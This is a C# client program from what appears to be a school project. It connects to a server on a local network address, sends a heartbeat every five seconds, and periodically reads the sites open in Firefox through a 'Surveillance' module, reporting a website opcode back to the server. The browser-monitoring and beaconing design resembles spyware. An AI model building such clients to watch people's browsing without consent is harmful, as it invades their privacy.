using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;

using System.Net;
using System.Threading;
using System.Net.Sockets;
using SkolProjectClient.TCP;
using SkolProjectClient.Surveillance;

namespace SkolProjectClient
{
    class Program
    {
        public static ConnectionManagement clientManagement;
        static void Main(string[] args)
        {
            clientManagement = new ConnectionManagement(new IPEndPoint(IPAddress.Parse("192.168.1.66"), 3334));
            Console.WriteLine("Connected to server!");

            ThreadPool.QueueUserWorkItem(new WaitCallback(sendHeart), null);
            ThreadPool.QueueUserWorkItem(new WaitCallback(OnSites), null);

            while (clientManagement.socket.Connected)
            {
                Console.ReadKey();
            }
        }

        public static void sendHeart(object pool)
        {
            while (clientManagement.socket.Connected)
            {
                clientManagement.socket.Send(new byte[] { (byte)Globals.opCodes.HEARTBEAT });
                Thread.Sleep(5000);
                Console.WriteLine("[HEARTBEAT]");
            }
        }

        public static void OnSites(object pool)
        {
            while (clientManagement.socket.Connected)
            {
                Console.WriteLine(SurveillanceC.GetOnlineSites(Globals.Browser.Firefox));
                clientManagement.socket.Send(new byte[] { (byte)Globals.opCodes.WEBSITE });
                Thread.Sleep(5000);
                Console.WriteLine("[WEBSITE]");
            }
        }
    }
}

